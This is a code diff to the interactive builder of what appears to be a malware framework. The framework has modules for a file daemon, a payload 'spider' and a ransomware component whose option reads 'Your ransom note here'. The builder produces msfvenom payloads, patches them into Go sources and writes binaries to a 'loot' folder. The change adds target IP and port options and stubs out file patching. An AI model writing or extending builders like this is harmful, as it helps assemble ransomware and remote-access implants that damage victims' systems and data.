@@ -33,6 +33,8 @@ MODULE_OPTIONS = {
     },
     'daemon/filedaemon': {
         'PORT': '8080',
+        'TARGET_IP': '127.0.0.1',
+        'TARGET_PORT': '9000',
     },
     'daemon/bartmoss': {
         'NOTE': 'Your ransom note here',
@@ -198,22 +200,14 @@ def restore_spider_go(original_lines):
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
-def patch_filedaemon_port(port):
-    go_path = os.path.join('DAEMONS', 'filedaemon.go')
-    with open(go_path, 'r') as f:
-        lines = f.readlines()
-    with open(go_path, 'w') as f:
-        for line in lines:
-            if line.strip().startswith('port := '):
-                f.write(f'port := "{port}"\n')
-            else:
-                f.write(line)
-    return lines
+def patch_filedaemon_env(target_ip, target_port):
+    # The new filedaemon.go uses environment variables, so we don't need to patch the file
+    # Just return None to indicate no patching was done
+    return None
 
 def restore_filedaemon_go(original_lines):
-    go_path = os.path.join('DAEMONS', 'filedaemon.go')
-    with open(go_path, 'w') as f:
-        f.writelines(original_lines)
+    # No restoration needed for the new filedaemon.go
+    pass
 
 def shell():
     current_module = None
@@ -281,8 +275,10 @@ def shell():
                                 continue
                             spider_original = patch_spider_base64(payload_path)
                         elif modname == 'daemon/filedaemon':
-                            port = MODULE_OPTIONS.get('daemon/filedaemon', {}).get('PORT', '8080')
-                            filedaemon_original = patch_filedaemon_port(port)
+                            opts = MODULE_OPTIONS.get('daemon/filedaemon', {})
+                            target_ip = opts.get('TARGET_IP', '127.0.0.1')
+                            target_port = opts.get('TARGET_PORT', '9000')
+                            filedaemon_original = patch_filedaemon_env(target_ip, target_port)
                         
                         # Generate single module name
                         module_name = modname.split('/')[-1]
@@ -337,10 +333,12 @@ def shell():
                                     output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                     continue
                                 spider_original = patch_spider_base64(payload_path)
-                            # Patch filedaemon.go with selected port if needed
+                            # Patch filedaemon.go with target IP and port if needed
                             if modname == 'daemon/filedaemon':
-                                port = MODULE_OPTIONS.get('daemon/filedaemon', {}).get('PORT', '8080')
-                                filedaemon_original = patch_filedaemon_port(port)
+                                opts = MODULE_OPTIONS.get('daemon/filedaemon', {})
+                                target_ip = opts.get('TARGET_IP', '127.0.0.1')
+                                target_port = opts.get('TARGET_PORT', '9000')
+                                filedaemon_original = patch_filedaemon_env(target_ip, target_port)
                             go_paths.append(go_path)
                         final_name = BUILD_OPTIONS['exe_name']
                         final_path = os.path.abspath(os.path.join(loot_dir, final_name))
